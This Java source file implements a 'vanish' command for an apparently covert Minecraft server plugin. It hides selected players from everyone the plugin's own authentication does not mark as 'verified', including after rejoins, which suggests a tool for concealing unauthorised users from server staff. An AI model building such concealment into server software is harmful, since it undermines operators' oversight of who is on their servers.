package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import java.io.IOException;
import java.util.ArrayList;
import java.util.UUID;

public class Vanish implements Command, Listener {
    public final ArrayList<UUID> invisList = new ArrayList<>();
    private Z_ z;

    @Override
    public int minAConsoleArgs() {
        return 1;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"v", "vanish", "vv"};
    }

    @Override
    public String getDescription() {
        return "Hides you from tab/from other players, including whenever a player or you rejoin.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        if (context.getCommand().equalsIgnoreCase("vv")) {
            sender.sendMessage(Colors.Prefix + Colors.Caution + "You are currently " + (this.invisList.contains(executor.getUniqueId()) ? Colors.Success + "vanished" : Colors.Failure + "not vanished") + Colors.Caution + ".");
            return;
        }

        String[] args = context.getArgs();
        Player selected = executor;
        if (args.length != 0) {
            selected = Bukkit.getPlayer(args[0]);
            if (selected == null) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
                return;
            }
        }

        Player finalSelected = selected;
        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            String name = finalSelected.getName().equals(sender.getName()) ? "you" : finalSelected.getName();
            UUID uuid = finalSelected.getUniqueId();
            if (invisList.contains(uuid)) {
                invisList.remove(uuid);
                SilentChest.toggled.remove(uuid);

                hidePlayer(finalSelected, false);
                sender.sendMessage(Colors.Prefix + Colors.Failure + "Unvanishing " + name + "!");
                return;
            }

            invisList.add(uuid);
            hidePlayer(finalSelected, true);

            if (!SilentChest.toggled.contains(uuid)) {
                SilentChest.toggled.add(uuid);
            }

            sender.sendMessage(Colors.Prefix + Colors.Success + "Vanished " + name + "!");
        });
    }

    @Override
    public void onEnable(Z_ z) {
        this.z = z;
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    private void hidePlayer(Player player, boolean hide) {
        Bukkit.getScheduler().scheduleSyncDelayedTask(this.z, () -> {
            for (Player p : Bukkit.getOnlinePlayers()) {
                try {
                    if (!z.getAuth().isVerified(p.getName())) {
                        if (hide) {
                            p.hidePlayer(player);
                        } else {
                            p.showPlayer(player);
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    @EventHandler
    private void onJoin(PlayerJoinEvent e) throws IOException, InterruptedException {
        Player player = e.getPlayer();
        UUID uuid = player.getUniqueId();
        if (this.invisList.contains(uuid)) {
            hidePlayer(player, true);
            return;
        }

        if (this.z.getAuth().isVerified(player.getName())) {
            return;
        }

        Bukkit.getScheduler().scheduleSyncDelayedTask(this.z, () -> {
            for (UUID invisUUID : this.invisList) {
                Player found = Bukkit.getPlayer(invisUUID);
                if (found != null) {
                    player.hidePlayer(found);
                }
            }
        });
    }
}
